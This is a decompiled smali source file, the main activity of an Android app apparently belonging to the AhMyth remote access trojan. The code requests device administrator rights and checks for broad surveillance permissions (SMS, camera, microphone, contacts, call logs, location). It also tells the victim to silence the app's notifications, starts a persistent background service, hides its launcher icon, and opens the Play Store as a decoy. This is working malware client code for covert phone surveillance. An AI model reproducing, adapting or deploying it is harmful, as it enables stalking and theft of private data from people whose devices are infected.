.class public Lahmyth/mine/king/ahmyth/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "MainActivity.java"


# instance fields
.field componentName:Landroid/content/ComponentName;

.field devicePolicyManager:Landroid/app/admin/DevicePolicyManager;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 23
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    return-void
.end method

.method private checkPermissionGrantedOrNot()Z
    .locals 2

    .line 112
    const-string v0, "android.permission.READ_SMS"

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_0

    .line 113
    const-string v0, "android.permission.SEND_SMS"

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_0

    .line 114
    const-string v0, "android.permission.RECEIVE_SMS"

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_0

    .line 115
    const-string v0, "android.permission.CAMERA"

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_0

    .line 116
    const-string v0, "android.permission.WRITE_EXTERNAL_STORAGE"

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_0

    .line 117
    const-string v0, "android.permission.READ_EXTERNAL_STORAGE"

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_0

    .line 118
    const-string v0, "android.permission.READ_PHONE_STATE"

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    if-nez v1, :cond_0

    .line 119
    const-string v1, "android.permission.READ_CALL_LOG"

    invoke-static {p0, v1}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    if-nez v1, :cond_0

    .line 120
    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_0

    .line 121
    const-string v0, "android.permission.CALL_PHONE"

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_0

    .line 122
    const-string v0, "android.permission.PROCESS_OUTGOING_CALLS"

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_0

    .line 123
    const-string v0, "android.permission.READ_CONTACTS"

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_0

    .line 124
    const-string v0, "android.permission.RECORD_AUDIO"

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_0

    .line 125
    const-string v0, "android.permission.MODIFY_AUDIO_SETTINGS"

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_0

    .line 126
    const-string v0, "android.permission.ACCESS_FINE_LOCATION"

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    .line 112
    :goto_0
    return v0
.end method

.method private hideAppIcon()V
    .locals 4

    .line 87
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1d

    if-ge v0, v1, :cond_0

    .line 88
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->getComponentName()Landroid/content/ComponentName;

    move-result-object v1

    const/4 v2, 0x2

    const/4 v3, 0x1

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 90
    :cond_0
    return-void
.end method

.method private openAppSettingsPage(Ljava/lang/String;)V
    .locals 3
    .param p1, "toastMsg"    # Ljava/lang/String;

    .line 103
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.settings.APPLICATION_DETAILS_SETTINGS"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 104
    .local v0, "intent":Landroid/content/Intent;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "package:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 105
    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 106
    const/4 v1, 0x1

    invoke-static {p0, p1, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    .line 107
    return-void
.end method

.method private openPlayStore()V
    .locals 2

    .line 94
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 95
    .local v0, "intent":Landroid/content/Intent;
    const-string v1, "android.intent.action.VIEW"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 96
    const-string v1, "https://play.google.com/store/apps"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 97
    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 98
    return-void
.end method


# virtual methods
.method public synthetic lambda$onCreate$0$MainActivity(Landroid/view/View;)V
    .locals 0
    .param p1, "view"    # Landroid/view/View;

    .line 74
    invoke-direct {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->openPlayStore()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 6
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 30
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 32
    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->requestWindowFeature(I)Z

    .line 33
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->getWindow()Landroid/view/Window;

    move-result-object v1

    const/16 v2, 0x400

    invoke-virtual {v1, v2, v2}, Landroid/view/Window;->setFlags(II)V

    .line 35
    const v1, 0x7f0b001c

    invoke-virtual {p0, v1}, Lahmyth/mine/king/ahmyth/MainActivity;->setContentView(I)V

    .line 37
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lahmyth/mine/king/ahmyth/receivers/AdminReceiver;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v1, p0, Lahmyth/mine/king/ahmyth/MainActivity;->componentName:Landroid/content/ComponentName;

    .line 38
    const-string v1, "device_policy"

    invoke-virtual {p0, v1}, Lahmyth/mine/king/ahmyth/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/admin/DevicePolicyManager;

    iput-object v1, p0, Lahmyth/mine/king/ahmyth/MainActivity;->devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

    .line 40
    iget-object v2, p0, Lahmyth/mine/king/ahmyth/MainActivity;->componentName:Landroid/content/ComponentName;

    invoke-virtual {v1, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 42
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 43
    .local v0, "intent":Landroid/content/Intent;
    iget-object v1, p0, Lahmyth/mine/king/ahmyth/MainActivity;->componentName:Landroid/content/ComponentName;

    const-string v2, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {v0, v2, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 44
    const v1, 0x7f0e0024

    invoke-virtual {p0, v1}, Lahmyth/mine/king/ahmyth/MainActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    const-string v2, "android.app.extra.ADD_EXPLANATION"

    invoke-virtual {v0, v2, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 45
    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 47
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->finish()V

    .line 48
    .end local v0    # "intent":Landroid/content/Intent;
    goto :goto_1

    .line 50
    :cond_0
    invoke-direct {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->checkPermissionGrantedOrNot()Z

    move-result v1

    if-nez v1, :cond_1

    .line 51
    const-string v0, "Grant all permission!"

    invoke-direct {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->openAppSettingsPage(Ljava/lang/String;)V

    goto :goto_1

    .line 55
    :cond_1
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    const-string v3, "Disable all notifications of this app."

    if-lt v1, v2, :cond_3

    .line 57
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lahmyth/mine/king/ahmyth/services/MainService;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 58
    .local v1, "serviceIntent":Landroid/content/Intent;
    invoke-virtual {p0, v1}, Lahmyth/mine/king/ahmyth/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 60
    invoke-static {p0}, Landroidx/core/app/NotificationManagerCompat;->from(Landroid/content/Context;)Landroidx/core/app/NotificationManagerCompat;

    move-result-object v2

    invoke-virtual {v2}, Landroidx/core/app/NotificationManagerCompat;->areNotificationsEnabled()Z

    move-result v2

    if-eqz v2, :cond_2

    .line 62
    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    .line 63
    .local v2, "intent":Landroid/content/Intent;
    const-string v4, "android.settings.APP_NOTIFICATION_SETTINGS"

    invoke-virtual {v2, v4}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 64
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v4

    const-string v5, "android.provider.extra.APP_PACKAGE"

    invoke-virtual {v2, v5, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 65
    invoke-virtual {p0, v2}, Lahmyth/mine/king/ahmyth/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 66
    invoke-static {p0, v3, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 68
    .end local v1    # "serviceIntent":Landroid/content/Intent;
    .end local v2    # "intent":Landroid/content/Intent;
    :cond_2
    goto :goto_0

    .line 70
    :cond_3
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lahmyth/mine/king/ahmyth/services/MainService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 71
    invoke-direct {p0, v3}, Lahmyth/mine/king/ahmyth/MainActivity;->openAppSettingsPage(Ljava/lang/String;)V

    .line 74
    :goto_0
    const v0, 0x7f080130

    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    new-instance v1, Lahmyth/mine/king/ahmyth/MainActivity$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lahmyth/mine/king/ahmyth/MainActivity$$ExternalSyntheticLambda0;-><init>(Lahmyth/mine/king/ahmyth/MainActivity;)V

    invoke-virtual {v0, v1}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 75
    invoke-direct {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->hideAppIcon()V

    .line 76
    invoke-direct {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->openPlayStore()V

    .line 77
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->finish()V

    .line 81
    :goto_1
    return-void
.end method
